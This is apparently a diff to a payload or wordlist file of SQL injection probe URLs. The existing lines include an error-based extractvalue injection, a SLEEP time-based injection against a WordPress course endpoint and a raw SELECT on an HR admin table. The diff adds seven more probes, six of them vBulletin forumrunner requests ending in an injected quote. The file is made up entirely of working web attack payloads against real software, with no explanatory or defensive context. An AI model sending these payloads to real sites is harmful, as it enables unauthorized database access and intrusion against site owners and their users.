@@ -176,3 +176,10 @@
 /Api/portal/elementEcodeAddon/getSqlData?sql=Select%20*%20from%20HrmResourceManager%20where%20loginid=%27sysadmin%27
 /comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5(202072102)))),@`%27`
 /wp-json/lp/v1/courses/archive-course?&order_by=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))X)&limit=-1
+/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/boards/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/board/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/forum/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/forums/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/vb/forumrunner/request.php?d=1&cmd=get_spam_data&postids=-1%27
+/api/v1/components?name=1&1%5B0%5D=&1%5B1%5D=a&1%5B2%5D=&1%5B3%5D=or+
